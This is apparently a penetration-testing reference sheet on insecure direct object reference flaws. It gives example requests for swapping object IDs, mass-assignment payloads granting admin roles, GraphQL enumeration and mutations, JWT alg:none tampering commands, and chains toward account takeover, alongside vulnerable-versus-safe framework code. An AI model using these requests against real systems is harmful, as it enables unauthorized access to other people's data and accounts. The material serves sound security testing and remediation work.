# IDOR — Insecure Direct Object Reference

## Overview

Insecure Direct Object Reference (IDOR) occurs when an application exposes internal
object identifiers (IDs, keys, filenames) and fails to verify that the requester has
permission to access the referenced object. It is the most common form of Broken Access
Control — OWASP #1 in both 2021 and 2025.

**Distinction:**
- **Horizontal escalation** — user A accesses user B's resources (same privilege level)
- **Vertical escalation** — low-privilege user accesses admin or elevated-privilege resources

**Impact:** Data exfiltration, account takeover, unauthorized modification or deletion,
financial fraud, PII exposure.

**Sources:**
- OWASP Top 10 A01:2021 — Broken Access Control
- PortSwigger Web Security Academy — Access control vulnerabilities
- HackerOne Hacktivity — Shopify IDOR ($25,000+), Twitter IDOR, multiple API IDOR reports

---

## Direct Object Reference Patterns

### Sequential Integers (Most Common)

```
GET /api/users/1001/profile
GET /api/orders/54321
GET /invoices/download?id=9982
GET /documents/3847/view

# Test: increment/decrement by 1, jump to low numbers (1, 2, 100)
GET /api/users/1000/profile   ← attacker's account
GET /api/users/1001/profile   ← victim (IDOR)
```

### GUIDs / UUIDs

```
GET /api/reports/550e8400-e29b-41d4-a716-446655440000

# UUID v1 is time-based and partially predictable
# UUID v4 is random — usually safe, but:
#   - May be leaked in other responses (email headers, logs exposed via info disclosure)
#   - May be guessable if seeded with low entropy
#   - Try enumerating GUIDs found in JS source, API responses, emails

# UUID v1 timestamp extraction:
python3 -c "import uuid; u=uuid.UUID('550e8400-e29b-11d4-a716-446655440000'); print(u.time)"
```

### Predictable Hashes

```
# MD5 of email — common pattern for "unsubscribe" or "avatar" links
https://target.com/avatar/d41d8cd98f00b204e9800998ecf8427e   # MD5 of ""
https://target.com/unsubscribe/5f4dcc3b5aa765d61d8327deb882cf99  # MD5 of "password"

# Brute-force with known email list:
import hashlib
emails = ['user@example.com', 'admin@target.com']
for e in emails:
    print(hashlib.md5(e.encode()).hexdigest(), e)
```

### Base64-Encoded IDs

```
# Decode, modify, re-encode
eyJ1c2VySWQiOiAxMDAxfQ==  →  {"userId": 1001}  →  {"userId": 1002}  →  eyJ1c2VySWQiOiAxMDAyfQ==

# Common decode targets
echo "eyJ1c2VySWQiOiAxMDAxfQ==" | base64 -d
# → {"userId": 1001}

# Re-encode modified value
echo -n '{"userId": 1002}' | base64
```

### Compound Keys and Indirect References

```
# Object referenced by combination of fields
GET /api/messages?from=1001&to=1002

# Indirect reference via association
GET /api/user/settings        ← user ID inferred from session
POST /api/transfer { "to_account": "ACC-9982" }   ← account number is the IDOR

# Filename-based
GET /files/2024/user_export_john_smith.csv
GET /reports/Q4_finance_internal.xlsx
```

---

## Horizontal Privilege Escalation

User A accesses or modifies resources belonging to User B at the same privilege level.

### Classic Examples

```http
# Access another user's profile
GET /api/users/1002/profile HTTP/1.1
Authorization: Bearer <User-A-Token>

# Download another user's invoice
GET /invoices/download?invoice_id=88821
Authorization: Bearer <User-A-Token>

# Read another user's messages
GET /api/conversations/9920/messages
Authorization: Bearer <User-A-Token>

# Edit another user's shipping address
PUT /api/addresses/44123
{"street": "Attacker St"}
Authorization: Bearer <User-A-Token>

# Access another user's OAuth tokens / connected apps
GET /api/users/1002/connected_accounts
```

### Two-Account Testing Procedure

```
1. Create Account A and Account B (different emails/sessions)
2. With Account A: create objects, note all IDs returned (orders, profiles, files, etc.)
3. With Account B: attempt to access Account A's object IDs
4. Record HTTP status (200 = IDOR, 403 = properly protected, 404 = obscured)
5. Repeat for every CRUD operation: GET, PUT/PATCH, DELETE, POST (to add associations)
```

---

## Vertical Privilege Escalation

A lower-privilege user accesses functionality or data restricted to higher roles.

### Parameter Tampering for Role Elevation

```http
# Account creation — try adding role field
POST /api/register
{"email": "a@evil.com", "password": "...", "role": "admin"}

# Profile update — mass assignment injection
PUT /api/users/1001
{"name": "Attacker", "role": "admin", "is_admin": true, "plan": "enterprise"}

# API call with undocumented admin parameter
GET /api/users?admin=true
GET /api/reports?include_all_users=true
DELETE /api/users/1001?force=true
```

### Accessing Admin Endpoints Directly

```
GET /admin/users
GET /admin/dashboard
GET /api/admin/logs
POST /api/admin/impersonate
GET /management/users
GET /internal/metrics

# Try with unprivileged session token — if no server-side role check, returns data
```

### Forced Browsing to Privileged Objects

```
# Typical pattern: app renders admin links only in UI, but no server-side check
GET /reports/all_users_export.csv    ← linked only in admin panel
GET /api/audit_log?all=true
GET /billing/summary?org=all
```

---

## Mass Assignment

Frameworks that auto-bind request body fields to model attributes allow injection of
privileged properties if not explicitly allowlisted.

### Common Vulnerable Attributes

```json
{
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "email_verified": true,
  "balance": 99999,
  "credits": 9999,
  "plan": "enterprise",
  "subscription": "premium",
  "account_type": "staff",
  "permissions": ["read", "write", "admin"],
  "bypass_2fa": true
}
```

### Framework-Specific Notes

```ruby
# Rails — vulnerable pattern (params without strong parameters)
def create
  @user = User.new(params[:user])   # mass assignment vulnerability

# Safe (strong parameters)
def user_params
  params.require(:user).permit(:name, :email, :password)
end
```

```python
# Django REST Framework — vulnerable serializer
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'   # exposes all fields including is_staff, is_superuser

# Safe
fields = ['id', 'username', 'email']
```

```javascript
// Express + Mongoose — vulnerable
router.put('/user/:id', async (req, res) => {
  await User.findByIdAndUpdate(req.params.id, req.body);  // mass assignment
});

// Safe
const allowed = { name: req.body.name, email: req.body.email };
await User.findByIdAndUpdate(req.params.id, allowed);
```

---

## IDOR in REST APIs

### Parameter Location Coverage

```
# Path parameter
GET /api/v1/users/1001/orders

# Query string
GET /api/orders?user_id=1001&page=1

# Request body
POST /api/messages/send
{"recipient_id": 1002, "message": "hello"}

# Header
X-User-ID: 1001
X-Account-ID: ACC-9982

# Cookie
user_session=eyJ1c2VySWQiOiAxMDAxfQ==   ← contains userId, modify to 1002
```

### HTTP Method Testing

```http
# Try all methods on every endpoint even if only one is documented
GET    /api/users/1002   ← read
POST   /api/users/1002   ← create/trigger action
PUT    /api/users/1002   ← replace
PATCH  /api/users/1002   ← partial update
DELETE /api/users/1002   ← delete

# Also try:
HEAD   /api/users/1002   ← metadata leak
OPTIONS /api/users/1002  ← reveals allowed methods
```

### JWT Sub Claim Manipulation

```
# Decode JWT payload (middle section, base64)
eyJzdWIiOiAxMDAxLCAicm9sZSI6ICJ1c2VyIn0=
→ {"sub": 1001, "role": "user"}

# If server doesn't properly verify signature or trusts sub blindly:
# Modify sub to 1002, re-encode (alg:none attack or weak secret brute-force)
# Tools: jwt_tool, jwt.io

python3 jwt_tool.py <token> -T    # tamper mode
python3 jwt_tool.py <token> -X a  # alg:none attack
```

---

## IDOR in GraphQL

### Direct ID Arguments

```graphql
# Query another user's data by changing the id argument
query {
  user(id: 1002) {
    email
    phoneNumber
    paymentMethods {
      cardNumber
      expiry
    }
  }
}
```

### Introspection-Based Discovery

```graphql
# Enumerate all types and fields to find IDOR opportunities
query {
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Then test every query/mutation that accepts an id/userId/objectId argument
```

### Query Aliasing for Mass Enumeration

```graphql
# Fetch multiple users in one request using aliases
query {
  user1: user(id: 1001) { email }
  user2: user(id: 1002) { email }
  user3: user(id: 1003) { email }
  user4: user(id: 1004) { email }
}
```

### Mutation IDOR

```graphql
# Modify another user's object via mutation
mutation {
  updateUserProfile(userId: 1002, input: {
    email: "attacker@evil.com"
  }) {
    success
    user { email }
  }
}

# Delete another user's resource
mutation {
  deleteDocument(documentId: "DOC-9982") {
    success
  }
}
```

---

## Chaining IDOR with Other Vulnerabilities

### IDOR + Info Disclosure → Targeted Attack

```
1. IDOR on /api/users/{id} leaks email + phone
2. Use leaked PII for spear phishing or SIM swap
3. Bypass 2FA → full account takeover
```

### IDOR + Stored XSS → ATO

```
1. IDOR allows writing to another user's profile fields (PUT /api/users/1002)
2. Inject stored XSS payload into bio/name field
3. When admin reviews the profile → XSS fires in admin context → admin ATO
```

### IDOR + SSRF → Internal Pivot

```
1. IDOR on webhook configuration endpoint (PUT /api/webhooks/9982)
   → change webhook URL to attacker-controlled target or internal IP
2. Trigger the webhook → SSRF via legitimate-looking webhook delivery
3. Reach internal services via victim's webhook mechanism
```

### IDOR in Password Reset → ATO

```
1. Password reset generates token linked to user ID
2. IDOR: request reset for user A, intercept token, send reset for user B
   (if token is stored server-side without tying it to the requesting session)
3. Or: reset link endpoint /reset?token=X&user_id=1002 — swap user_id

Example flow:
POST /api/password/reset {"email": "victim@target.com"}
→ Token generated for user_id=1002

GET /reset?token=abc123&user_id=1002  ← attacker intercepts, changes 1002 to 1001
```

### IDOR + Race Condition

```
# Some apps check permission then act — race between check and action
1. Initiate a transfer for your own account
2. Race condition: before server validates, swap account_id in request
3. Transfer executes against target account

# Tools: Turbo Intruder, Burp Suite Repeater with parallel requests
```

---

## Testing Methodology

### Setup

```
1. Create two standard user accounts (Account A and Account B)
2. For privileged endpoint testing, also create one admin account if self-registration allows role selection
3. Capture all traffic with Burp Suite proxy
4. Build a sitemap of all endpoints and parameters using Spider + manual browsing
```

### Systematic Testing Steps

```
1. Map all IDs/references visible to Account A (object IDs, file IDs, report IDs)
2. Log in as Account B, attempt to access every ID from Account A's session
3. For each endpoint: test GET, PUT, PATCH, DELETE, POST with swapped IDs
4. Check request body, query params, path params, and headers for ID parameters
5. Test endpoints with no auth header at all → some endpoints have no auth check
6. Try deleted/deactivated object IDs → may bypass access controls if objects not fully removed
7. Test export and download endpoints — these are high-value and often overlooked
8. Test batch/bulk operations: {"ids": [1001, 1002, 1003]} → may return all if one belongs to you
9. Check pagination/listing endpoints for data leakage across users
10. Test state-change operations: mark as read, archive, delete — may affect other users' items
```

### Response Interpretation

```
200 OK + data from Account A → confirmed IDOR
200 OK + Account B's own data (no cross-access) → properly scoped
401 Unauthorized → no auth token was included (check your request)
403 Forbidden → server checked authorization, properly protected
404 Not Found → may be obscured IDOR (object exists but returns 404 to non-owners)
500 Internal Server Error → may indicate access reached the object but crashed — investigate further
```

---

## Common Endpoints and Parameters to Test

| Endpoint Pattern | Parameter | Notes |
|-----------------|-----------|-------|
| `/api/users/{id}` | path id | Profile data, PII |
| `/api/users/{id}/settings` | path id | 2FA, notification prefs |
| `/api/orders/{orderId}` | path id | Purchase history |
| `/api/invoices/{id}` | path id | Financial data |
| `/invoices/download?id=` | query id | File download |
| `/api/messages/{id}` | path id | Private messages |
| `/api/documents/{id}` | path id | Uploaded files |
| `/api/payment_methods/{id}` | path id | Card data |
| `/api/addresses/{id}` | path id | Personal info |
| `/api/admin/users` | — | Admin-only listing |
| `/api/reports/export` | `user_id`, `org_id` | Bulk data export |
| `/api/referrals/{code}` | path code | Referral credit manipulation |
| `/api/tokens/{id}/revoke` | path id | Revoke another user's session |
| `/api/tickets/{id}` | path id | Support ticket contents |
| `/api/webhooks/{id}` | path id | Webhook URL/secret |
| `/api/team/members/{id}` | path id | Team management |
| `/api/subscriptions/{id}` | path id | Billing plan |

---

## Detection Notes

- IDOR is authorization, not authentication — always include a valid auth token (just not the owner's)
- Low-severity IDOR (read-only, non-sensitive) → still reportable; focus on sensitive data or write-access for higher impact
- Use Burp's Autorize extension to automate IDOR testing across all requests with a second user's session cookie
- Check JavaScript source for hardcoded endpoints and object ID patterns not visible in normal app flow
- Test mobile app API traffic — mobile apps often expose undocumented API endpoints with weaker access control
- IDOR in admin panel → always higher severity, often leads to full platform compromise
